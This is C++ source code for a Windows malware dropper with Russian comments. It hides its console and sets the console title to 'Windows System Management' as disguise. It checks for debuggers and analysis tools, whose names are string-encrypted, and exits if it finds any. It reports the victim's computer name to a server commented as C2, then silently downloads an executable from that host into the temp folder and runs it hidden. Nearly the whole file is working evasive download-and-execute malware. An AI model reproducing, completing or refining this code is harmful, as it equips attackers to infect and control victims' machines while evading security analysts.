#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <wininet.h>
#include <urlmon.h>
#include <iostream>
#include <string>
#include <vector>
#include <time.h>
#include <tlhelp32.h>
#include <shlwapi.h>
#include <wincrypt.h>
#include <algorithm>
#include "skCrypter.h"
#include <fstream>


#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "ntdll.lib")

#define NtCurrentProcess() ( (HANDLE)(LONG_PTR)-1)

// NtQueryInformationProcess
extern "C" NTSTATUS NTAPI NtQueryInformationProcess(
    HANDLE ProcessHandle,
    ULONG ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength);

typedef struct _PROCESS_BASIC_INFORMATION {
    ULONG PebBaseAddress;
    ULONG BasePriority;
    ULONG UniqueProcessId;
    ULONG InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION;

bool sendLogToServer(const std::string& logMessage) {
    const char* server = "192.168.100.1"; // IP сервера C2
    const char* resource = "/log"; // Путь на сервере для приёма логов
    const int port = 5001; // Порт сервера

    HINTERNET hInternet = InternetOpenA("MyLogClient", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return false;

    // Соединяемся с сервером
    HINTERNET hConnect = InternetConnectA(hInternet, server, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return false;
    }

    // Создаём POST запрос
    const char* acceptTypes[] = { "application/json", NULL };
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", resource, NULL, NULL, acceptTypes, 0, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return false;
    }

    // Формируем тело запроса (например, JSON с сообщением)
    std::string postData = "{\"log\":\"" + logMessage + "\"}";

    BOOL sent = HttpSendRequestA(hRequest,
        "Content-Type: application/json\r\n",
        -1,
        (LPVOID)postData.c_str(),
        (DWORD)postData.length());

    bool result = sent == TRUE;

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return result;
}

std::string getCurrentTimeString() {
    time_t now = time(NULL);
    struct tm timeInfo;
    localtime_s(&timeInfo, &now);

    char buffer[20];
    strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", &timeInfo);
    return std::string(buffer);
}

std::string getComputerName() {
    char name[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(name);
    if (GetComputerNameA(name, &size)) {
        return std::string(name, size);
    }
    return "UnknownComputer";
}



void writeLog(const std::string& message) {
    // Пытаемся отправить на сервер
    if (!sendLogToServer(message)) {
        // Здесь НЕ сохраняем локально — просто пропускаем
        // Можно добавить вывод в консоль, если хочешь
        // std::cerr << "Failed to send log to server, log discarded." << std::endl;
    }
    std::cout << message << std::endl;
}


//  антиотладочные методы
bool detectDbgBreakPointPatch() {
    FARPROC addr = GetProcAddress(GetModuleHandleA("ntdll.dll"), "DbgBreakPoint");
    if (!addr) return false;
    if (*(BYTE*)addr != 0xCC) {
        writeLog("DbgBreakPoint patched! Debugger detected.");
        return true;
    }
    writeLog("DbgBreakPoint not patched.");
    return false;
}

bool detectIsDebuggerPresent() {
    if (IsDebuggerPresent()) {
        writeLog("Debugger detected by IsDebuggerPresent.");
        return true;
    }
    writeLog("No debugger detected by IsDebuggerPresent.");
    return false;
}

bool detectRemoteDebuggerPresent() {
    BOOL isRemoteDebuggerPresent = FALSE;
    if (CheckRemoteDebuggerPresent(GetCurrentProcess(), &isRemoteDebuggerPresent) && isRemoteDebuggerPresent) {
        writeLog("Debugger detected by CheckRemoteDebuggerPresent.");
        return true;
    }
    writeLog("No debugger detected by CheckRemoteDebuggerPresent.");
    return false;
}

bool detectHardwareBreakpoints() {
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    HANDLE hThread = GetCurrentThread();

    if (GetThreadContext(hThread, &ctx)) {
        if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) {
            writeLog("Hardware breakpoints detected.");
            return true;
        }
    }
    writeLog("No hardware breakpoints detected.");
    return false;
}

bool detectDebuggerByDebugObject() {
    HANDLE hDebObj = NULL;
    NTSTATUS status = NtQueryInformationProcess(NtCurrentProcess(), 0x1E, &hDebObj, sizeof(hDebObj), NULL);

    if (status == 0x00000000 && hDebObj) {
        writeLog("Debugger detected by DebugObject!");
        return true;
    }
    writeLog("No debugger detected by DebugObject.");
    return false;
}

bool detectDebuggerByProcessDebugFlags() {
    ULONG NoDebugInherit = 0;
    NTSTATUS status = NtQueryInformationProcess(NtCurrentProcess(), 0x1F, &NoDebugInherit, sizeof(NoDebugInherit), NULL);

    if (status == 0x00000000 && NoDebugInherit == 0) {
        writeLog("Debugger detected by ProcessDebugFlags!");
        return true;
    }
    writeLog("No debugger detected by ProcessDebugFlags.");
    return false;
}

bool detectParentProcess() {
    PROCESS_BASIC_INFORMATION baseInf;
    NTSTATUS status = NtQueryInformationProcess(NtCurrentProcess(), 0, &baseInf, sizeof(baseInf), NULL);

    if (status == 0x00000000) {
        DWORD parentProcessId = baseInf.InheritedFromUniqueProcessId;
        HANDLE hParentProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, parentProcessId);
        if (hParentProcess) {
            DWORD dwSize = MAX_PATH;
            char parentProcessName[MAX_PATH];
            if (QueryFullProcessImageNameA(hParentProcess, 0, parentProcessName, &dwSize)) {
                std::string parentName(parentProcessName);
                std::transform(parentName.begin(), parentName.end(), parentName.begin(), ::tolower);
                if (parentName.find("ollydbg.exe") != std::string::npos ||
                    parentName.find("x64dbg.exe") != std::string::npos ||
                    parentName.find("x32dbg.exe") != std::string::npos) {
                    writeLog("Debugger detected by Parent Process!");
                    CloseHandle(hParentProcess);
                    return true;
                }
            }
            CloseHandle(hParentProcess);
        }
    }
    writeLog("No debugger detected by Parent Process.");
    return false;
}

bool detectSecurityTools() {
    const wchar_t* tools[] = {
        skCrypt(L"wireshark"), skCrypt(L"procmon"), skCrypt(L"processhacker"),
        skCrypt(L"processhacker2"), skCrypt(L"procexp"), skCrypt(L"ida64"),
        skCrypt(L"ollydbg"), skCrypt(L"pestudio"), skCrypt(L"dnspy"), skCrypt(L"x64dbg")
    };

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        writeLog("Failed to create process snapshot for security tools check.");
        return false;
    }

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    bool detected = false;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            std::wstring procName = pe32.szExeFile;
            std::transform(procName.begin(), procName.end(), procName.begin(), ::tolower);
            for (const auto& tool : tools) {
                if (procName.find(tool) != std::wstring::npos) {
                    writeLog("Security tool detected: " + std::string(procName.begin(), procName.end()));
                    detected = true;
                    break;
                }
            }
            if (detected) break;
        } while (Process32NextW(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    if (!detected) writeLog("No security tools detected.");
    return detected;
}


bool detectDebuggerAll() {
    return detectIsDebuggerPresent() ||
        detectRemoteDebuggerPresent() ||
        detectHardwareBreakpoints() ||
        detectDbgBreakPointPatch() ||
        detectDebuggerByDebugObject() ||
        detectDebuggerByProcessDebugFlags() ||
        detectParentProcess();
}

std::wstring getDownloadURL() {
    auto url = skCrypt(L"http://192.168.100.1:8080/Autoruns.exe");
    return url.decrypt();
}


bool checkInternetConnection() {
    const wchar_t* servers[] = {
        skCrypt(L"https://www.google.com"),
        skCrypt(L"https://www.microsoft.com"),
        skCrypt(L"https://www.cloudflare.com")
    };

    for (const auto& server : servers) {
        if (InternetCheckConnectionW(server, FLAG_ICC_FORCE_CONNECTION, 0)) {
            writeLog("Internet connection detected.");
            return true;
        }
    }

    writeLog("No internet connection detected.");
    return false;
}

bool downloadFile(const std::wstring& url, const std::wstring& savePath) {
    bool result = (URLDownloadToFileW(NULL, url.c_str(), savePath.c_str(), 0, NULL) == S_OK);
    writeLog(std::string("Download file result: ") + (result ? "Success" : "Failed"));
    return result;
}

bool executeFile(const std::wstring& filePath) {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    BOOL result = CreateProcessW(filePath.c_str(), NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (result) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        writeLog("Executed file successfully: " + std::string(filePath.begin(), filePath.end()));
    }
    else {
        writeLog("Failed to execute file: " + std::string(filePath.begin(), filePath.end()));
    }
    return result;
}


void writeSessionSeparator() {
    time_t now = time(NULL);
    char timeStr[64];
    struct tm* timeInfo = localtime(&now); // сохраняем результат localtime
    strftime(timeStr, sizeof(timeStr), "%Y-%m-%d %H:%M:%S", timeInfo);

    std::string computerName = getComputerName();
    

    writeLog("\n----- New Session Started -----");
    writeLog("Time: " + std::string(timeStr));
    writeLog("Computer Name: " + computerName);
    writeLog("------------------------------\n");
}

int main() {

    HWND consoleWindow = GetConsoleWindow();
    ShowWindow(consoleWindow, SW_HIDE);

    srand(static_cast<unsigned int>(time(NULL) ^ GetCurrentProcessId()));
    auto consoleTitle = skCrypt(L"Windows System Management");
    SetConsoleTitleW(consoleTitle);

    writeSessionSeparator();

    char currentDir[MAX_PATH];
    if (GetCurrentDirectoryA(MAX_PATH, currentDir)) {
        std::cout << "Current directory for logs: " << currentDir << std::endl;
        writeLog(std::string("Current directory for logs: ") + currentDir);
    }
    else {
        std::cout << "Failed to get current directory." << std::endl;
    }

    if (detectDebuggerAll()) {
        writeLog("Exiting due to debugger detection.");
        return 0;
    }

    if (detectSecurityTools()) {
        writeLog("Exiting due to security tool detection.");
        return 0;
    }


    wchar_t tempPath[MAX_PATH];
    if (GetTempPathW(MAX_PATH, tempPath) == 0) {
        writeLog("Failed to get temp path.");
        return 1;
    }

    auto encryptedSavePath = skCrypt(L"autoruns.exe");
    std::wstring savePath = std::wstring(tempPath) + encryptedSavePath.decrypt();
    std::wstring downloadURL = getDownloadURL();

    if (!downloadFile(downloadURL, savePath)) {
        writeLog("Exiting due to failed download.");
        return 1;
    }

    if (!executeFile(savePath)) {
        writeLog("Exiting due to failed execution.");
        return 1;
    }

    return 0;
}
